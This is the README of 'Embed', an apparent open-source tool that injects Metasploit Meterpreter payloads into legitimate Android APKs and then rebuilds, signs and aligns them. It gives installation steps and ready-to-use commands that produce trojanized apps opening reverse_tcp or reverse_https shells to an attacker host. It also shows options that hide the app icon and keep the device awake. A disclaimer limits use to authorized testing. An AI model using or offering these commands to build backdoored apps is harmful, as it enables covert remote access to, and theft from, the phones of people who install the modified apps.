# Embed

> Inject a Metasploit payload into a legitimate Android APK.

Embed is a Ruby-based Android backdooring tool. It generates a Metasploit
payload with `msfvenom`, decompiles the target APK, injects the payload into the
launcher activity, adds the payload permissions to the manifest, rebuilds the
APK, signs it and aligns it.

Use Embed only against applications you own or have explicit written permission
to test. Distributing modified APKs or using them to access other people's
devices is illegal in most jurisdictions.

## Features

- Generates Android Meterpreter payloads with `msfvenom`.
- Merges payload permissions into the original manifest.
- Injects the payload into the launcher activity or a selected `onCreate()` hook.
- Supports three signing workflows: the Android debug key, an existing keystore
  or a newly generated keystore.
- Rebuilds, signs and aligns the final APK.
- Includes a Termux package and a manual Linux setup script.

## Requirements

| Component | Purpose |
|---|---|
| Ruby 3.x | Runs `embed.rb`. |
| Bundler and gems | `nokogiri` and `activesupport`. |
| Metasploit Framework | Provides `msfvenom`. |
| OpenJDK 21 | Runs Apktool and the signing tools. |
| Apktool | Decompiles and rebuilds APKs. |
| `aapt` | Reads the launcher activity and manifest metadata. |
| `apksigner` / `jarsigner` | Signs the rebuilt APK. |
| `zipalign` | Aligns the final APK. |
| `xml2axml` | Re-encodes the modified manifest when required. |

## Installation

### Termux package (recommended)

```bash
pkg update
pkg install embed
```

The package installs the runtime and dependencies. Metasploit is suggested but
is not installed automatically:

```bash
pkg install metasploit-framework
```

### Manual installation on Linux

```bash
git clone https://github.com/ivam3/embed.git
cd embed
bash setup install
```

The setup script installs the system dependencies, downloads Apktool, installs
the Android debug keystore and runs Bundler. If your distribution uses another
package manager, install the equivalent packages first:

```bash
# Debian/Ubuntu example
sudo apt install ruby ruby-dev build-essential git wget curl default-jdk \
  android-sdk-build-tools apktool zipalign
```

Then run the script with Bundler:

```bash
bundle exec ruby embed.rb --help
```

### Setup options

| Command | Description |
|---|---|
| `bash setup install` | Install all dependencies and Ruby gems. |
| `bash setup apt` | Add the i-HakLab APT repository and install `embed`. |
| `bash setup apktool` | Download the pinned Apktool version. |
| `bash setup keystore` | Download the Android debug keystore. |
| `bash setup java8` | Install the legacy Java 8 runtime. |

## Usage

```bash
embed <target.apk> <msfvenom options>
```

Example:

```bash
embed app.apk -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444
```

For an HTTPS payload:

```bash
embed app.apk -p android/meterpreter/reverse_https LHOST=example.com LPORT=8443
```

The result is written next to the original file as:

```text
<target>_final.apk
```

### Signing options

Embed asks how to sign the rebuilt APK:

| Option | Description |
|---|---|
| `1` | Use the Android debug keystore (`~/.android/debug.keystore`). |
| `2` | Use an existing keystore. |
| `3` | Create a new keystore. |

The default debug keystore uses the standard Android credentials:

```text
Keystore password: android
Key alias: androiddebugkey
Key password: android
```

Do not use the debug key for production or Play Store releases. Use option `2`
with your own keystore for any real signing workflow.

## Workflow

1. `msfvenom` generates the payload APK.
2. Apktool decompiles the original APK and the payload.
3. Embed locates the launcher activity.
4. The payload smali files are copied into the original APK.
5. The payload permissions are merged into the original manifest.
6. The APK is rebuilt, signed and aligned.
7. The final file is written as `<target>_final.apk`.

## Configuration

Embed does not use a configuration file. Payload options are passed directly to
`msfvenom` on the command line.

Useful `msfvenom` options:

```bash
embed app.apk -p android/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 \
  LPORT=4444 \
  AndroidHideAppIcon=true \
  AndroidWakelock=true
```

Run `msfvenom --list payloads` to see the payloads available in your Metasploit
installation.

## Troubleshooting

### `msfvenom: command not found`

Install Metasploit:

```bash
pkg install metasploit-framework
```

### `aapt: command not found`

Install the Android build tools or the Termux package:

```bash
pkg install aapt apksigner
```

### Apktool cannot decode the target

Some APKs use unsupported resources or split APK formats. Try a different
Apktool version:

```bash
bash setup apktool
```

### The rebuilt APK is not signed

Choose option `2` and provide a valid keystore, or run option `1` to create the
debug keystore. Verify the file exists:

```bash
ls -l ~/.android/debug.keystore
```

### Injection fails in `onCreate()`

The tool falls back to a manual hook selection when the launcher activity cannot
be found automatically. Choose a smali file that contains
`onCreate(Landroid/os/Bundle;)V`.

## Legal notice

Embed is a security testing tool. You are responsible for complying with the
law, Android platform rules and the terms of any application you modify. The
author does not accept responsibility for misuse, account bans, device damage or
legal consequences.

Report issues or request help at <https://t.me/Ivam3_Bot>.

## License

GNU. See [LICENSE](LICENSE).

##### Follow me on [Socials Network](https://ivam3.github.io)
